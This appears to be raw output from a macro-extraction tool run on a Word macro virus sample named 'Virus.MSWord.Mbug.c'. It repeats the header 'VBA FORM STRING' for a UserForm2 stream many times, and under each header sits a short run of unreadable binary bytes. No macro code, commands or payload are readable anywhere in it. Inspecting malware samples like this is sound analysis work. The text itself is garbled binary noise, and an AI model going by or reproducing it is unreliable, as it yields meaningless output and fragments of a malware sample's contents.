VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�.��cj�蘮Uɐ)�!��#�>6��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sh�V%�c;�;��kMU
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y !���J��C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۂ�o��� q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4(�뎋֠�Xj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-P���l
�ӵ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$���ek���?e�l}z�[C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�S�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ͣQEÔ�I_F��E�T.�a��iӉ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u���ɵ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�`p�ag
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S2�pB��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&�U�k[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fGy3Ǚ꩔F"����!�����=)�6�U��u��Q'0��ёsLj�5x|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;n��]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	�/�y�;h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�:q�9H�k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V_��դ�@s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ӄz���{�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���C\��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qmM�f[�1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
333fff�������������fff33̙��33�ff�33
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3̙f@ 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�̙�P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fff3�̙��3��f��333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3��f3f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f3f3�̙3�3f�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�f������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��3ff���3��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ff�33f���33�ff�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3��f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�̙��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f3f̙̙3��f��3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3����X
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q��� %nLA�D	�!S2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�ˊ0U�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8s�8s&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@u��	�gУ;�f4�4�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�I�FR�Q�欪C�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cJ��U���`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۔�Y�i5jm�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@G��six����]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dt�<W�Yƀ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Vk���ˌ�nV
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s.��vQƌ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i̩c?�)�5j�8E�a�6E�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�tv��S�76~��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�S�=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ӣw���h���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~o��{z�{����#������__�|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��sPE�_v�!8�w��'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R������~4`(�d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�U�����Y,���T\�8���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ae�x�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[1j�@d�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�CeB?��CG?��A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���xT��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���1�#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5���N;�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�Ph���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h7TZãMR'饕:zip
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���jԔt:�`���~��{��ڪ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZT�RM:k�����o�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k��Ⅷ�J쌯��b�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�Tٺ�dʵ@�[5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x]����*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��d�H�{�W��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e*�T޻
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 m�?X��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\:��YA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P&�����	)p��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�`�Ũ�x��2Ā/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

?p�oR�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��0SLե0F�riB�$� �	7Qe��o.�tE8���U���q�ej-��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ךX��sð����X����Ѡ�fԛ	�(��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v�-xD����xË
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�)R�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&f�1�M�V\弸L
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h53P��z3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�=��>��&�|��ܘ��m;aX�{w��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��)U>&Eof
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M�����W���䇯���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
333fff�������������fff33̙��33�ff�33
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
